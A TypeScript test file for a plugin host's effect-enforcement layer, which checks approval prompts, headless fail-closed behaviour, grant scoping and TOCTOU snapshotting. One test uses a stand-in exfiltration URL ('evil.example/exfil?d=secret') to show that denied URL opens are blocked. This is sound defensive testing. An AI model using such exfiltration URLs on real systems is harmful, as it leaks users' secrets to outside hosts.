/**
 * effect-enforcement.test.ts — effect-boundary ENFORCEMENT.
 *
 * Covers the three hard guarantees and the security/UX properties:
 *   • FLAG OFF → no approval, executes exactly as today (byte-for-byte).
 *   • FLAG ON + foreground + write → approval AT THE EFFECT; deny throws + the real
 *     impl never runs; allow proceeds and returns the impl's value.
 *   • FLAG ON + read → never prompts.
 *   • Headless → NO modal (fail-closed throw); the mutation does not execute.
 *   • Dedup → one allow-always/allow-once suppresses repeats for the SAME descriptor,
 *     but a different target still re-prompts (a grant is never widened).
 *   • A throwing arg getter still triggers the gate (no suppression).
 *   • hostFetch is NOT in the generic gated set (it self-gates inline, verb-derived).
 */
import { describe, it, expect, beforeEach } from "vitest";
import type { ApprovalChoice, ApprovalDecision, ApprovalGate, ApprovalRequest } from "../approval-gate.js";
import {
  enforceMutatingEffects,
  gateMutatingEffect,
  runWithEffectGateContext,
  currentEffectGateContext,
  GATED_EFFECT_PATHS,
  ENFORCEMENT_EXCLUSIONS,
  EffectBoundaryDeniedError,
  __resetEffectGrantsForTest,
} from "../effect-enforcement.js";
import {
  writeClassifiedPaths,
  CHOKEPOINT_EFFECT,
  HOSTAPI_EFFECT_BY_PATH,
} from "../effect-kind.js";
import {
  instrumentEffectsByPath,
  INSTRUMENTED,
} from "../hostapi-effect-recorder.js";
import {
  createEffectLedger,
  runWithEffectLedger,
  type EffectLedger,
} from "../effect-ledger.js";

beforeEach(() => {
  __resetEffectGrantsForTest();
});

/** A stub ApprovalGate that records every request and answers with a fixed choice. */
function makeGate(choice: ApprovalChoice | ApprovalChoice[]): {
  gate: ApprovalGate;
  requests: Array<Omit<ApprovalRequest, "requireExplicit">>;
} {
  const requests: Array<Omit<ApprovalRequest, "requireExplicit">> = [];
  const answers = Array.isArray(choice) ? [...choice] : null;
  const gate = {
    requestAndWait: async (
      req: Omit<ApprovalRequest, "requireExplicit">,
    ): Promise<ApprovalDecision> => {
      requests.push(req);
      const next = answers ? (answers.shift() ?? "deny-once") : (choice as ApprovalChoice);
      return { requestId: req.id, choice: next };
    },
  } as unknown as ApprovalGate;
  return { gate, requests };
}

/** A fake per-plugin hostApi whose real impls only log the method they ran. */
function makeApi(log: string[]) {
  return {
    // gated async writes
    triggerConversation: async (_spec: unknown): Promise<{ accepted: boolean }> => {
      log.push("trigger");
      return { accepted: true };
    },
    callLlm: async (_prompt: unknown): Promise<string> => {
      log.push("llm");
      return "resp";
    },
    spawnWorker: async (_spec: unknown): Promise<{ pid: number; socketPath: null }> => {
      log.push("spawnWorker");
      return { pid: 123, socketPath: null };
    },
    storage: {
      write: async (_rel: string, _data?: unknown): Promise<void> => {
        log.push("write");
      },
      // gated path but a READ — never prompts (effect from SOT).
      read: async (_rel: string): Promise<string> => {
        log.push("read");
        return "data";
      },
    },
    // a SYNC write chokepoint — NOT gated here (covered by the pre-exec ask), must stay sync.
    registerKeywords: (_kw: unknown): void => {
      log.push("kw");
    },
  };
}

const deps = (gate: ApprovalGate, flag: boolean) => ({
  pluginId: "p1",
  approvalGate: gate,
  flagEnabled: () => flag,
});

describe("enforceMutatingEffects — FLAG OFF = zero behaviour change", () => {
  it("a mutating chokepoint raises NO approval and executes exactly as before", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, false));

    let writeResult: unknown = "sentinel";
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.triggerConversation({ source: "s" });
      writeResult = await api.storage.write("a.txt", "x");
      await api.callLlm("hello");
    });

    expect(requests).toHaveLength(0); // no modal whatsoever
    expect(log).toEqual(["trigger", "write", "llm"]); // every impl ran in order
    expect(writeResult).toBeUndefined(); // identical return value (void)
  });

  it("flag-off passes through even with NO gate context bound (boot-time call)", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, false));
    await api.storage.write("a.txt", "x"); // outside any invocation scope
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["write"]);
  });
});

describe("enforceMutatingEffects — FLAG ON + foreground + write → approval AT THE EFFECT", () => {
  it("ALLOW → the real impl proceeds and returns its value", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    let llmResult: unknown;
    await runWithEffectGateContext({ headless: false, toolName: "meeting_start" }, async () => {
      llmResult = await api.callLlm("hi");
    });

    expect(requests).toHaveLength(1);
    expect(requests[0]).toMatchObject({
      source: "plugin",
      sourcePluginId: "p1",
      toolName: "meeting_start",
      approvalScope: "callLlm",
      args: { effect: "write", methodPath: "callLlm" },
    });
    expect(log).toEqual(["llm"]);
    expect(llmResult).toBe("resp");
  });

  it("DENY → throws EffectBoundaryDeniedError and the mutation NEVER executes", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.storage.write("secret.json", "x")).rejects.toBeInstanceOf(
        EffectBoundaryDeniedError,
      );
    });

    expect(requests).toHaveLength(1); // it DID ask
    expect(requests[0].args).toMatchObject({ methodPath: "storage.write", target: "secret.json" });
    expect(log).toEqual([]); // ... and the real write never ran
  });

  it("a nested-namespace WRITE is gated under its dotted PATH", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("notes/a.md", "x");
    });
    expect(requests[0]).toMatchObject({ approvalScope: "storage.write" });
    expect(log).toEqual(["write"]);
  });
});

describe("enforceMutatingEffects — openExternalUrl is now GATED (moved out of the exclusions)", () => {
  /** A hostApi exposing openExternalUrl as a real async write impl. */
  function makeUrlApi(log: string[]) {
    return {
      openExternalUrl: async (_url: string): Promise<void> => {
        log.push("open");
      },
    };
  }

  it("FLAG ON + foreground → asks at the effect-gate; DENY → the URL is NOT opened", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.openExternalUrl("https://evil.example/exfil?d=secret")).rejects.toBeInstanceOf(
        EffectBoundaryDeniedError,
      );
    });
    expect(requests).toHaveLength(1); // the effect-gate fired
    expect(requests[0]).toMatchObject({
      category: "agent-action",
      args: { effect: "write", methodPath: "openExternalUrl", target: "https://evil.example" },
    });
    expect(log).toEqual([]); // DENY → the browser was never opened
  });

  it("FLAG OFF → byte-for-byte pass-through (no modal, URL opens)", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate, false));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.openExternalUrl("https://example.com");
    });
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["open"]);
  });
});

describe("enforceMutatingEffects — reads never prompt", () => {
  it("a gated-namespace READ method passes through with no approval", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    let v: unknown;
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      v = await api.storage.read("a.txt");
    });
    expect(requests).toHaveLength(0);
    expect(v).toBe("data");
    expect(log).toEqual(["read"]);
  });

  it("a SYNC write chokepoint is NOT gated and stays synchronous (no contract break)", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      const ret = api.registerKeywords([]); // returns void synchronously, not a Promise
      expect(ret).toBeUndefined();
    });
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["kw"]);
  });
});

describe("enforceMutatingEffects — headless = NO modal (fail-closed)", () => {
  it("a write in a headless invocation throws WITHOUT asking and does not execute", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    let caught: unknown;
    await runWithEffectGateContext({ headless: true, toolName: "routine_tool" }, async () => {
      try {
        await api.storage.write("a.txt", "x");
      } catch (err) {
        caught = err;
      }
    });

    expect(requests).toHaveLength(0); // a modal is impossible headless — never asked
    expect(caught).toBeInstanceOf(EffectBoundaryDeniedError);
    expect((caught as EffectBoundaryDeniedError).reason).toBe("headless");
    expect(log).toEqual([]); // fail-closed: the mutation did NOT run
  });
});

describe("enforceMutatingEffects — dedup (one grant ends repeats, never widened)", () => {
  it("allow-always suppresses repeat modals for the SAME descriptor", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("a.txt", "2");
      await api.storage.write("a.txt", "3");
    });
    expect(requests).toHaveLength(1); // one "always" ended the repeats
    expect(log).toEqual(["write", "write", "write"]);
  });

  it("allow-once dedups N writes to one target WITHIN a single invocation", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("a.txt", "2");
    });
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write", "write"]);
  });

  it("a DIFFERENT target re-prompts — the grant is not widened beyond its descriptor", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("b.txt", "2"); // different target → fresh approval
    });
    expect(requests).toHaveLength(2);
    expect(log).toEqual(["write", "write"]);
  });

  it("deny-always short-circuits a repeat to a throw without re-prompting", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.storage.write("a.txt", "1")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
      await expect(api.storage.write("a.txt", "2")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1); // remembered the deny, did not re-ask
    expect(log).toEqual([]);
  });
});

describe("enforceMutatingEffects — a hostile arg getter cannot suppress the gate", () => {
  it("a throwing spec.source getter still fires the write gate (target falls back to undefined)", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    const hostileSpec = {
      get source(): never {
        throw new Error("hostile getter");
      },
      prompt: "p",
    };
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.triggerConversation(hostileSpec);
    });
    expect(requests).toHaveLength(1); // the gate fired despite the throwing getter
    // no target → a method-wide grant; the breadth marker is surfaced (M3).
    expect(requests[0].args).toEqual({
      effect: "write",
      methodPath: "triggerConversation",
      methodWide: true,
    });
    expect(log).toEqual(["trigger"]);
  });
});

describe("gateMutatingEffect — direct unit behaviour", () => {
  it("flag OFF → returns without asking", async () => {
    const { gate, requests } = makeGate("deny-once");
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await gateMutatingEffect({
        pluginId: "p1",
        methodPath: "storage.write",
        effect: "write",
        target: "a",
        approvalGate: gate,
        flagEnabled: () => false,
      });
    });
    expect(requests).toHaveLength(0);
  });

  it("read effect → returns without asking even when the flag is ON", async () => {
    const { gate, requests } = makeGate("deny-once");
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await gateMutatingEffect({
        pluginId: "p1",
        methodPath: "hostFetch",
        effect: "read",
        target: "https://x",
        approvalGate: gate,
        flagEnabled: () => true,
      });
    });
    expect(requests).toHaveLength(0);
  });

  it("no gate context bound → returns without asking (out-of-invocation hostApi call)", async () => {
    const { gate, requests } = makeGate("deny-once");
    expect(currentEffectGateContext()).toBeUndefined();
    await gateMutatingEffect({
      pluginId: "p1",
      methodPath: "hostFetch",
      effect: "write",
      target: "https://x",
      approvalGate: gate,
      flagEnabled: () => true,
    });
    expect(requests).toHaveLength(0);
  });
});

describe("GATED_EFFECT_PATHS — SOT-derived async-only membership", () => {
  it("contains the design's async write chokepoints (incl. openExternalUrl) and EXCLUDES the verb-derived hostFetch + sync/circular writes", () => {
    for (const p of [
      "storage.write",
      "storage.writeJson",
      "storage.rm",
      "storage.mkdir",
      "openAuthWindow",
      "openAuthPartitionViewer",
      "clearAuthPartition",
      "callLlm",
      "spawnWorker",
      "triggerConversation",
      "agentApproval.request",
      // openExternalUrl is now GATED (egress/exfil-class) — moved out of the
      // exclusions; it is async so the await-based wrapper can gate it.
      "openExternalUrl",
    ]) {
      expect(GATED_EFFECT_PATHS.has(p)).toBe(true);
    }
    // hostFetch self-gates inline (verb-derived); registerKeywords is sync;
    // config.set / agentApproval.respond are the bounded-ungated exclusions.
    for (const p of ["hostFetch", "registerKeywords", "config.set", "agentApproval.respond"]) {
      expect(GATED_EFFECT_PATHS.has(p)).toBe(false);
    }
  });
});

describe("MAJOR-1 — the gated set is SOT-DERIVED + FAIL-CLOSED (not hand-curated)", () => {
  it("every gated path is WRITE-classified + ASYNC in the SOT (never a read, never sync)", () => {
    for (const p of GATED_EFFECT_PATHS) {
      const spec = HOSTAPI_EFFECT_BY_PATH[p];
      expect(spec, `gated path ${p} must exist in the SOT`).toBeDefined();
      // write-classified: a static write (selfRecorded hostFetch is never gated here)
      expect(CHOKEPOINT_EFFECT[spec.kind as keyof typeof CHOKEPOINT_EFFECT]).toBe("write");
      // async: the await-based wrapper can only gate an already-async method
      expect(spec.async, `gated path ${p} must be declared async`).toBe(true);
    }
  });

  it("COMPLETENESS — gated ∪ exclusions PARTITIONS every write-classified path (fail-closed)", () => {
    const writeClassified = new Set(writeClassifiedPaths());
    const accountedFor = new Set<string>([
      ...GATED_EFFECT_PATHS,
      ...ENFORCEMENT_EXCLUSIONS.keys(),
    ]);

    // (a) Every write-classified path is either gated or explicitly excluded — a
    // NEW write chokepoint added to the SOT can never silently ship un-enforced.
    const unaccounted = [...writeClassified].filter((p) => !accountedFor.has(p));
    expect(
      unaccounted,
      `write-classified path(s) that are NEITHER gated NOR explicitly excluded — gate them (async) or add to ENFORCEMENT_EXCLUSIONS: ${unaccounted.join(", ")}`,
    ).toEqual([]);

    // (b) No exclusion (or gated path) is fabricated — every accounted path is
    // actually write-classified in the SOT (you cannot exclude a read / unknown).
    const overReaching = [...accountedFor].filter((p) => !writeClassified.has(p));
    expect(
      overReaching,
      `gated/excluded path(s) that are NOT write-classified in the SOT (stale entry?): ${overReaching.join(", ")}`,
    ).toEqual([]);

    // (c) The two sets are DISJOINT — a path is gated XOR excluded, never both.
    const both = [...GATED_EFFECT_PATHS].filter((p) => ENFORCEMENT_EXCLUSIONS.has(p));
    expect(both, `path(s) both gated AND excluded: ${both.join(", ")}`).toEqual([]);
  });

  it("each exclusion carries a documented one-line reason", () => {
    for (const [path, reason] of ENFORCEMENT_EXCLUSIONS) {
      expect(reason, `exclusion ${path} must document a reason`).toBeTruthy();
      expect(reason.length).toBeGreaterThan(10);
    }
    // the four deliberate exclusions (openExternalUrl was MOVED to the gated set)
    expect([...ENFORCEMENT_EXCLUSIONS.keys()].sort()).toEqual(
      ["agentApproval.respond", "config.set", "hostFetch", "registerKeywords"].sort(),
    );
    // openExternalUrl is NO LONGER an exclusion — it is effect-gated.
    expect(ENFORCEMENT_EXCLUSIONS.has("openExternalUrl")).toBe(false);
  });
});

describe("MAJOR-2 — registerKeywords is a SYNC, BOUNDED-ungated exclusion (records a write, never a confirmed read)", () => {
  it("is an explicit exclusion AND is WRITE-classified + SYNC in the SOT", () => {
    // excluded from gating (it is SYNC — cannot await a modal)…
    expect(ENFORCEMENT_EXCLUSIONS.has("registerKeywords")).toBe(true);
    expect(GATED_EFFECT_PATHS.has("registerKeywords")).toBe(false);
    // …but still WRITE-classified, so the recorder marks any tool that calls it as
    // mutating (never a confirmed read at the recorder). Under the relaxation flag
    // it runs UNGATED, but is bounded (start-only, not reachable mid-tool.execute).
    expect(CHOKEPOINT_EFFECT.registerKeywords).toBe("write");
    // and it is SYNC (no `async` flag) — the structural reason it is excluded.
    expect(HOSTAPI_EFFECT_BY_PATH.registerKeywords.async).toBeUndefined();
  });

  it("recording registerKeywords flips the ledger to mutating (a write at the recorder, never a confirmed read)", async () => {
    const wrapped = instrumentEffectsByPath({ registerKeywords: (_kw: unknown): void => {} });
    const ledger: EffectLedger = createEffectLedger("cid-kw");
    await runWithEffectLedger(ledger, async () => {
      wrapped.registerKeywords([{ keyword: "k", skillId: "s" }]);
    });
    // reaching registerKeywords records a WRITE → the recorder never sees it as a
    // confirmed read. (The relaxation does not pre-classify read/write, so this is
    // about the recorder's honesty, not about retaining a pre-exec ask.)
    expect(ledger.summary().hasMutatingEffect).toBe(true);
  });
});

describe("M4 — headless NEVER honours a foreground-obtained grant (fail-closed before grant)", () => {
  it("a foreground allow-always for descriptor D does NOT allow D in a later headless run", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    // 1) FOREGROUND: bless the descriptor with an allow-always grant.
    await runWithEffectGateContext({ headless: false, toolName: "fg" }, async () => {
      await api.storage.write("a.txt", "1");
    });
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write"]);

    // 2) HEADLESS (unattended routine): the SAME descriptor must fail closed —
    //    the foreground grant cannot bypass the headless lane.
    let caught: unknown;
    await runWithEffectGateContext({ headless: true, toolName: "routine" }, async () => {
      try {
        await api.storage.write("a.txt", "2");
      } catch (err) {
        caught = err;
      }
    });
    expect(caught).toBeInstanceOf(EffectBoundaryDeniedError);
    expect((caught as EffectBoundaryDeniedError).reason).toBe("headless");
    expect(requests).toHaveLength(1); // no NEW modal (and the grant was NOT honoured)
    expect(log).toEqual(["write"]); // the headless write did NOT run
  });

  it("a foreground allow-once does not leak into a headless invocation either", async () => {
    const log: string[] = [];
    const { gate } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "fg" }, async () => {
      await api.storage.write("a.txt", "1");
    });
    // onceGrants are invocation-scoped, so they cannot reach the headless call,
    // but assert headless fails closed regardless.
    await runWithEffectGateContext({ headless: true, toolName: "routine" }, async () => {
      await expect(api.storage.write("a.txt", "2")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(log).toEqual(["write"]); // only the foreground write ran
  });
});

describe("M2 — object-field target is snapshotted ONCE at the gate (TOCTOU)", () => {
  it("the modal/grant target is a SINGLE read; a stateful getter cannot diverge it", async () => {
    const { gate, requests } = makeGate("allow-once");
    // The real impl re-reads spec.source INDEPENDENTLY of the gate; assert the
    // GATE pins its descriptor to ONE read (the first), so the modal + grant key
    // can never disagree with each other.
    const implSawSource: string[] = [];
    const api = enforceMutatingEffects(
      {
        triggerConversation: async (spec: { source: string }): Promise<{ accepted: boolean }> => {
          implSawSource.push(spec.source); // a SECOND, independent read by the impl
          return { accepted: true };
        },
      },
      deps(gate, true),
    );

    let reads = 0;
    const statefulSpec = {
      get source(): string {
        reads += 1;
        return `src-${reads}`; // a different value on every read
      },
    };

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.triggerConversation(statefulSpec);
    });

    // The gate read the getter EXACTLY ONCE for its descriptor (the first read)…
    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({ methodPath: "triggerConversation", target: "src-1" });
    // …and the impl's later independent read got a DIFFERENT value, proving the
    // gate's displayed/granted target is pinned to a single snapshot (not re-read).
    expect(implSawSource).toEqual(["src-2"]);
  });
});

describe("M3 — target-less blanket grants surface a method-wide breadth marker", () => {
  it("a write with NO target marks the descriptor methodWide; a target-scoped one omits it", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.callLlm("hi"); // no target → method-wide grant
      await api.storage.write("a.txt", "x"); // target → scoped grant
    });
    expect(requests[0].args).toMatchObject({ methodPath: "callLlm", methodWide: true });
    expect((requests[0].args as { target?: unknown }).target).toBeUndefined();
    expect(requests[1].args).toMatchObject({ methodPath: "storage.write", target: "a.txt" });
    expect((requests[1].args as { methodWide?: unknown }).methodWide).toBeUndefined();
  });

  it("spawnWorker approvals are scoped to worker command and filesystem grants", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate(["allow-session", "allow-session"]);
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));
    const base = {
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowReadPaths: ["C:/worker.py"],
      allowWritePaths: ["C:/index-a"],
    };

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.spawnWorker(base);
      await api.spawnWorker({ ...base, allowWritePaths: ["C:/index-a"] });
      await api.spawnWorker({ ...base, allowWritePaths: ["C:/index-b"] });
    });

    expect(requests).toHaveLength(2);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect((requests[0].args as { methodWide?: unknown }).methodWide).toBeUndefined();
    expect(JSON.parse((requests[0].args as { target: string }).target)).toMatchObject({
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowRead: ["C:/worker.py"],
      allowWrite: ["C:/index-a"],
    });
    expect(JSON.parse((requests[1].args as { target: string }).target)).toMatchObject({
      allowWrite: ["C:/index-b"],
    });
    expect(log).toEqual(["spawnWorker", "spawnWorker", "spawnWorker"]);
  });

  it("spawnWorker grants remain scoped by the host-bound plugin id", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate(["allow-session", "allow-session"]);
    const apiA = enforceMutatingEffects(makeApi(log), deps(gate, true));
    const apiB = enforceMutatingEffects(makeApi(log), {
      ...deps(gate, true),
      pluginId: "p2",
    });
    const spec = {
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowReadPaths: ["C:/worker.py"],
      allowWritePaths: ["C:/index"],
    };

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await apiA.spawnWorker(spec);
      await apiB.spawnWorker(spec);
    });

    expect(requests).toHaveLength(2);
    expect(requests[0].sourcePluginId).toBe("p1");
    expect(requests[1].sourcePluginId).toBe("p2");
    expect(requests[0].args).toMatchObject(requests[1].args);
    expect(log).toEqual(["spawnWorker", "spawnWorker"]);
  });

  it("spawnWorker malformed object specs do not become method-wide approvals", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-session");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.spawnWorker({});
    });

    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect((requests[0].args as { methodWide?: unknown }).methodWide).toBeUndefined();
    expect(JSON.parse((requests[0].args as { target: string }).target)).toEqual({
      workerId: "",
      command: "",
      allowRead: [],
      allowWrite: [],
    });
    expect(log).toEqual(["spawnWorker"]);
  });

  it("spawnWorker non-object specs do not become method-wide approvals", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-session");
    const api = enforceMutatingEffects(makeApi(log), deps(gate, true));

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await (api.spawnWorker as (spec: unknown) => Promise<unknown>)("not-a-spec");
    });

    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect((requests[0].args as { methodWide?: unknown }).methodWide).toBeUndefined();
    expect(JSON.parse((requests[0].args as { target: string }).target)).toEqual({
      workerId: "",
      command: "",
      allowRead: [],
      allowWrite: [],
      invalidSpec: true,
    });
    expect(log).toEqual(["spawnWorker"]);
  });
});

describe("composed stack — enforceMutatingEffects(instrumentEffectsByPath(raw))", () => {
  /** A raw hostApi-shaped object whose impls read `this` so we can prove binding. */
  function makeRawApi(log: string[]) {
    return {
      marker: "ROOT",
      callLlm: async function (this: { marker: string }, _p: unknown): Promise<string> {
        log.push(`llm:${this.marker}`);
        return "resp";
      },
      // a READ — never gated, always recorded
      getInstalledPluginIds: function (this: { marker: string }): string[] {
        log.push(`ids:${this.marker}`);
        return [];
      },
      storage: {
        marker: "STORAGE",
        write: async function (this: { marker: string }, _rel: string): Promise<void> {
          log.push(`write:${this.marker}`);
        },
      },
    };
  }

  function composed(log: string[], gate: ApprovalGate, flag: boolean) {
    return enforceMutatingEffects(
      instrumentEffectsByPath(makeRawApi(log) as unknown as Record<string, unknown>),
      deps(gate, flag),
    ) as unknown as ReturnType<typeof makeRawApi>;
  }

  it("FLAG OFF — recorder records, NO gate, impls run with correct `this` binding", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = composed(log, gate, false);
    const ledger = createEffectLedger("cid-off");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await api.callLlm("x");
        await api.storage.write("a.txt");
      }),
    );
    expect(requests).toHaveLength(0); // flag off → no modal
    // `this` reached the RAW namespace objects through BOTH layers
    expect(log).toEqual(["llm:ROOT", "write:STORAGE"]);
    // the pure recorder still recorded both writes (untouched by enforcement)
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual(["callLlm", "storageWrite"]);
  });

  it("FLAG ON + ALLOW — order is gate → record → impl (OUTER over recorder)", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = composed(log, gate, true);
    const ledger = createEffectLedger("cid-allow");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await api.callLlm("x");
      }),
    );
    expect(requests).toHaveLength(1); // gated
    expect(log).toEqual(["llm:ROOT"]); // impl ran after the allow
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual(["callLlm"]); // recorded
  });

  it("FLAG ON + DENY — a denied write is NEVER recorded (no phantom shadow row) and never runs", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = composed(log, gate, true);
    const ledger = createEffectLedger("cid-deny");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await expect(api.callLlm("x")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
      }),
    );
    expect(requests).toHaveLength(1); // it asked
    expect(log).toEqual([]); // the impl never ran
    // OUTER composition: the recorder sits INSIDE the gate, so a denied effect is
    // never recorded — no phantom mutation row in the shadow dataset.
    expect(ledger.summary().effects).toEqual([]);
  });

  it("a READ flows through both layers ungated and recorded", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = composed(log, gate, true);
    const ledger = createEffectLedger("cid-read");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        api.getInstalledPluginIds();
      }),
    );
    expect(requests).toHaveLength(0); // reads never prompt
    expect(log).toEqual(["ids:ROOT"]);
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual(["getInstalledPluginIds"]);
  });
});

describe("INSTRUMENTED idempotence symbol is PROPAGATED through the enforced wrapper", () => {
  it("the enforced output keeps INSTRUMENTED so a later instrument is a no-op (no double-wrap)", () => {
    const { gate } = makeGate("deny-once");
    const raw = {
      callLlm: async (): Promise<string> => "x",
      storage: { write: async (): Promise<void> => {} },
    };
    const instrumented = instrumentEffectsByPath(raw as unknown as Record<string, unknown>);
    const enforced = enforceMutatingEffects(instrumented, deps(gate, false));

    // the fresh enforced object still carries the recorder's idempotence symbol…
    expect((enforced as Record<symbol, unknown>)[INSTRUMENTED]).toBe(true);
    // …including nested namespaces…
    expect(((enforced as { storage: Record<symbol, unknown> }).storage)[INSTRUMENTED]).toBe(true);
    // …so re-instrumenting it is a no-op (returns the SAME object — no re-wrap).
    expect(instrumentEffectsByPath(enforced)).toBe(enforced);
  });
});
